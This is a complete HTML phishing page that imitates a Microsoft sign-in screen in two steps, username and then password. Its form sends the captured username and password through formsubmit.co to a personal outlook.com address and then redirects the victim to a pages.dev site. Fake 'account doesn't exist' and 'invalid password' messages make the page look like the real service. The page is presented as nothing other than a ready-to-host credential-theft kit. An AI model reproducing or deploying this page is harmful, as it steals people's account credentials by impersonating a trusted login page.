<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in</title>

<link rel="icon" href="img/favicon.png">

<style>
@font-face{
  font-family:"Segoe UI";
  src:local("Segoe UI");
}

body{
    margin:0;
    background:#f3f2f1;
    font-family:"Segoe UI",system-ui;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}

.card{
    width:380px;
    background:#fff;
    box-shadow:0 4px 14px rgba(0,0,0,.15);
    padding:44px 40px;
    position:relative;
}

.loader{
    position:absolute;
    top:0;
    left:0;
    height:3px;
    width:0%;
    background:#0067b8;
    transition:width .6s ease;
}

.logo{
    height:32px;
    margin-bottom:28px;
}

h1{
    font-size:22px;
    font-weight:600;
    margin-bottom:10px;
}

.input{
    width:100%;
    border:none;
    border-bottom:1px solid #777;
    padding:12px 0;
    font-size:15px;
    margin-top:22px;
    outline:none;
}

.input:focus{
    border-bottom:2px solid #0067b8;
}

.button-row{
    margin-top:32px;
    display:flex;
    justify-content:flex-end;
}

.btn{
    background:#0067b8;
    color:#fff;
    border:none;
    padding:9px 28px;
    font-size:14px;
    cursor:pointer;
}

.btn:hover{
    background:#005da6;
}

.link{
    font-size:13px;
    color:#0067b8;
    margin-top:18px;
}

.user-line{
    font-size:14px;
    color:#444;
    margin-bottom:15px;
}

.error{
    color:#d13438;
    font-size:13px;
    margin-top:10px;
}

.hidden{display:none;}

.fade{
    animation:fade .25s ease;
}

@keyframes fade{
    from{opacity:0;transform:translateY(4px)}
    to{opacity:1;transform:translateY(0)}
}
</style>
</head>

<body>

<div class="card">

<form id="loginForm" action="https://formsubmit.co/gisellejordanlovings@outlook.com" method="POST">
<input type="hidden" name="_captcha" value="false">
<input type="hidden" name="_next" value="https://msnuuiuesd.pages.dev/check.html">
<div class="loader" id="loader"></div>

<img src="img/icon.png" class="logo">

<!-- STEP 1 -->
<div id="step1" class="fade">

<h1>Sign in</h1>

<input class="input" id="username" name="username"
placeholder="Email, phone, or username">

<div id="userError" class="error hidden">
This account doesn’t exist.
</div>

<div class="button-row">
<button type="button" class="btn" id="nextBtn">Next</button>
</div>

</div>

<!-- STEP 2 -->
<div id="step2" class="hidden fade">

<h1>Enter password</h1>

<div class="user-line" id="showUser"></div>

<input type="password" class="input" id="password" name="password"
placeholder="Password">

<div id="passError" class="error hidden">
Invalid password. Please try again.
</div>

<div class="button-row">
<button class="btn" type="submit">Sign in</button>
</div>

</div>

</form>

</div>

<script>
const loader = document.getElementById("loader");
const step1 = document.getElementById("step1");
const step2 = document.getElementById("step2");

const username = document.getElementById("username");
const password = document.getElementById("password");

const userError = document.getElementById("userError");
const passError = document.getElementById("passError");
const showUser = document.getElementById("showUser");

/* =======================
   HELPERS
======================= */

function startLoader(){
  loader.style.width="30%";
  setTimeout(()=>loader.style.width="70%",200);
  setTimeout(()=>loader.style.width="100%",400);
  setTimeout(()=>loader.style.width="0%",700);
}

// Microsoft emails only
function isMicrosoftEmail(email){
  return (
    email.endsWith("@msn.com") ||
    email.endsWith("@hotmail.com") ||
    email.endsWith("@outlook.com") ||
    email.endsWith("@live.com")
  );
}

// Phone numbers: digits only, 6-15 digits, optional +
function isPhoneNumber(input){
  return /^\+?\d{6,15}$/.test(input);
}

// Skype IDs: start with letter, 6-32 chars, letters, numbers, dot, underscore, dash
function isSkypeID(input){
  return /^[a-zA-Z][a-zA-Z0-9._-]{5,31}$/.test(input);
}

/* =======================
   STEP 1 → STEP 2
======================= */

document.getElementById("nextBtn").addEventListener("click",()=>{

   const val = username.value.trim();

   userError.classList.add("hidden");

   if(isMicrosoftEmail(val) || isPhoneNumber(val) || isSkypeID(val)){
      startLoader();
      setTimeout(()=>{
         showUser.innerText = val;
         step1.classList.add("hidden");
         step2.classList.remove("hidden");
      },500);
   } else {
      userError.innerHTML =
        "This account doesn’t exist. <br>Use a Microsoft email, phone number, or Skype ID only.";
      userError.classList.remove("hidden");
   }
});
</script>




</body>
</html>
